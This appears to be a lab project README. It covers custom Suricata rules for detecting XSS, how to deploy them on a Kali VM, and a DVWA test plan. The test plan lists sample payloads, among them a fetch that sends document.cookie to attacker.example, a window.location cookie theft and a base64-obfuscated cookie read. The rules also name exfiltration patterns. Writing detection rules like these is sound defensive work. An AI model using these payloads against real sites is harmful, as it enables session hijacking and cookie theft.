# Custom Suricata Rules — XSS Detection

Custom Suricata rules authored by the team to extend XSS detection coverage
beyond what the default Emerging Threats Open ruleset catches. Lives here
in the repo for version control + reproducibility; the actual rules need
to be installed into the Kali monitoring VM to take effect.

## File

- **`xss_alerts.rules`** — 58 rules across 3 priority tiers (P1 critical,
  P2 high, P3 low). Author: Shaina (`KAUR97` on GitHub) — see
  `git log lab/suricata/xss_alerts.rules` for full history.

## Priority tier summary

| Tier | Count | Behaviour matched |
|------|-------|--------------------|
| P1 (critical) | 39 | Confirmed exploit chains: `document.cookie` + exfiltration channel (`fetch`, `Image()`, `XMLHttpRequest`, `sendBeacon`, `WebSocket`, `postMessage`, `window.location`), or `<script>` paired with `document.cookie` / `eval()` / `document.write()` / remote `src=`, or obfuscation (`String.fromCharCode`, `atob`) + cookie access. |
| P2 (high) | 12 | Encoded tag injection — script / iframe / marquee / details, in URI / POST body / headers. PCRE covers both raw `<` and URL-encoded `%3C` variants. |
| P3 (low) | 7 | Wide-net indicators — JS sink keywords (`eval(`, `innerHTML`, `document.write(`), raw HTML tags (`<img`, `<svg`, `<body`, `<input`, `<video`, `<audio`), event handlers (`onerror=`, `onload=`, `onmouseover=`, `onfocus=`). |

## Deployment — install into the Kali monitoring VM

**Important**: take a VirtualBox snapshot of the Kali VM BEFORE deploying.
Suricata config changes can break the running IDS; the snapshot lets you
roll back if anything goes wrong.

```bash
# (Inside the Kali VM)

# 1. Find where Suricata looks for rule files on THIS install
sudo grep "default-rule-path" /etc/suricata/suricata.yaml
# Common values: /var/lib/suricata/rules  (recent Kali)
#                /etc/suricata/rules      (some other distros)

# 2. Copy file into THAT directory. On recent Kali this is:
sudo cp /media/sf_soc-triage/p000774csitcp/lab/suricata/xss_alerts.rules \
        /var/lib/suricata/rules/xss_alerts.rules
# If your default-rule-path differs, substitute it for /var/lib/suricata/rules.

# 3. Wire into the loaded ruleset list
sudo nano /etc/suricata/suricata.yaml
# Find the `rule-files:` block (search /^rule-files:) and add:
#   - xss_alerts.rules

# 4. Validate config + rules parse cleanly BEFORE restart
sudo suricata -T -c /etc/suricata/suricata.yaml

# Expect: "Configuration provided was successfully loaded. Exiting."
# Pre-existing ET Open rules that fail with "Complete IP space negated"
# (e.g. sid:2011802, sid:2000328, sid:2002087) are noise — already broken
# before custom rules, do NOT block deployment.
# If a NEW error mentions xss_alerts.rules, do NOT restart — fix first.

# 5. Reload (or restart) Suricata
sudo systemctl reload suricata
# Or, if reload is not supported:
sudo systemctl restart suricata

# 6. Verify the rules loaded
sudo grep "rules loaded" /var/log/suricata/suricata.log | tail -1
# Should show a count +58 over the previous load
```

## Signature ID conflict check

The custom rules use SIDs **1000001–1000058** in the standard user-rule
range (1000000–1999999). The teammate-authored draft originally used
2000001–2000058, which collides with the Emerging Threats Open reserved
range (2000000–2999999) — Suricata refused to load it. The rules were
renumbered into the user range. Before deploying, confirm no other
collision:

```bash
sudo grep -h "sid:" /var/lib/suricata/rules/*.rules \
    | grep -oP "sid:\K\d+" \
    | sort -n | uniq -d
```

Empty output = no duplicates. Any output = renumber the conflicting SIDs
before deploying.

## Validation test plan

Before relying on the rules in evaluation or live demo, hand-test each
priority tier against DVWA. Goal: confirm rules fire on intended payloads
AND do NOT fire on benign traffic.

### P1 (critical) — confirmed exploit chains

Target: DVWA Reflected XSS endpoint at `/vulnerabilities/xss_r/`.

```text
# 1. Cookie exfiltration via fetch — should fire sid 1000001 / 2000002
   <script>fetch('http://attacker.example/?c='+document.cookie)</script>

# 2. Script tag + eval — should fire sid 1000015 / 1000016 / 1000017
   <script>eval('alert(1)')</script>

# 3. Cookie theft via window.location — should fire sid 1000009-1000011
   <script>window.location='http://x/?'+document.cookie</script>

# 4. Base64-obfuscated cookie access — should fire sid 1000037-1000039
   <script>eval(atob('ZG9jdW1lbnQuY29va2ll'))</script>
```

### P2 (high) — encoded tag injection

```text
# 5. URL-encoded script tag — should fire sid 1000040
   %3Cscript%3Ealert(1)%3C%2Fscript%3E

# 6. Raw iframe injection — should fire sid 1000043
   <iframe src=http://x></iframe>
```

### P3 (low) — wide-net indicators

```text
# 7. img with onerror — should fire sid 1000055 AND sid 1000057
   <img src=x onerror=alert(1)>

# 8. innerHTML sink — should fire sid 1000052
   ?test=document.innerHTML
```

### Negative tests — must NOT fire

```text
# 9. Plain text mentioning the word "script" or "javascript" — should NOT fire
   /vulnerabilities/xss_r/?name=I+saw+a+javascript+book+yesterday

# 10. Routine DVWA page load — should NOT fire
    /vulnerabilities/xss_r/

# 11. Image URL containing literal "img" in the path — should NOT fire
     /static/images/foo.png
```

### Test execution + recording

For each test:

```bash
# Inside the Kali VM, monitor alerts live in a second terminal
sudo tail -f /var/log/suricata/eve.json \
    | jq 'select(.event_type=="alert") | {sid: .alert.signature_id, msg: .alert.signature}'

# Then fire the payload from the host browser or curl
```

Record: which SID fired (or didn't), any false matches, any duplicates.

## Configuration toggle (for evaluation ablation)

The evaluation harness will support a `use_custom_xss_rules` boolean
(Phase 6 work) so the 2×2×2×2 evaluation matrix can compare:

| `use_custom_xss_rules` | Coverage tested |
|---|---|
| `false` | Default ET Open rules only — baseline |
| `true` | ET Open + custom XSS rules — recall improvement |

Recall delta between the two configurations is the measured contribution
of the custom rules to the project's evaluation report.

## Known limitations

1. **Priority signal not yet used by the AI agent.** The agent's
   `extract_attack_type()` collapses all XSS rules to `attack_type = "XSS"`
   regardless of P1 / P2 / P3 tier. The Suricata `priority:` field DOES
   set `alert.severity` (1 / 2 / 3) which surfaces in `severity_level`
   on the AlertRecord and reaches the LLM via the prompt — but the agent
   does not yet incorporate priority into the rule-based suggestion
   generator. Future work: emit different rule-based suggestions for
   P1 (urgent — invalidate sessions) vs P2 / P3 (audit / monitor).

2. **No `metadata: mitre_technique_id`** on the custom rules. ET Open
   ships these and our pipeline surfaces them in the prompt. The
   MITRE-tactic override (`_override_mitre_tactic`) currently maps from
   `attack_type` instead, so this is not blocking — but adding the
   metadata field would make the alerts self-describing.

3. **Rules apply only to `$EXTERNAL_NET -> $HTTP_SERVERS`.** Internal
   reflected XSS between Docker bridge IPs will not fire. Lab traffic
   from the host-only network (192.168.56.0/24) targeting DVWA on
   172.18.0.3 does match `$EXTERNAL_NET -> $HTTP_SERVERS` once
   `HOME_NET` is configured correctly.
